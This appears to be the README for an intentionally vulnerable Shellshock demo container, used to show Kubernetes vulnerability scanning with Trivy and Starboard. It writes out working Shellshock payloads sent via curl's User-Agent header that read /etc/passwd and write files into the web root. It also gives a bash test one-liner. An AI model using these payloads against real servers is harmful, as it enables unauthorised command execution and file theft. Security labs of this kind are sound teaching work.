docker-shellshockable
=====================

Docker container with Apache 2 / CGI shellshock vulnerability. This builds on an original version by [Thibault Normand](https://github.com/Zenithar)

### Build

```sh
docker build -t lizrice/shellshockable:0.1.0 .
```

### Find the vulnerability with Trivy

```sh
trivy image lizrice/shellshockable:0.1.0
```

Note: this wouldn't find the vulnerability if you build the vulnerable version of bash from source

### Install on Kubernetes with Helm

```sh
helm install shell-chart shellshockable/ --values shellshockable/values.yaml
```

### Port-forwarding

```sh
kubectl port-forward $(kubectl get pods -l app.kubernetes.io/name=shellshockable -o name) 8081:80
```

### Read files from the host

```sh
curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; /bin/cat /etc/passwd" localhost:8081/cgi-bin/shockme.cgi
```

### Create a new page

```sh
curl localhost:8081/liz.html
# doesn't exist yet

curl -A "() { :; }; echo hello > /var/www/html/liz.html" localhost:8081/cgi-bin/shockme.cgi

# Find new file
curl localhost:8081/liz.html
```
### Misc

Get into the host:

```sh
kubectl exec -it  $(kubectl get pods -l app.kubernetes.io/name=shellshockable -o name) bash
```

Test that a version of bash is exploitable:

```sh
env x='() { :; }; echo vulnerable' bash -c "echo test"
```

## Starboard

Install [starboard](https://github.com/aquasecurity/starboard) - for example `kubectl krew install starboard`
and  `kubectl starboard init` to create the CRDs.

```
$ `kubectl starboard find vulnerabilities deployment/shell-chart-shellshockable
$ `kubectl starboard get vulnerabilities deployment/shell-chart-shellshockable
```

Run `octant` to view them there.



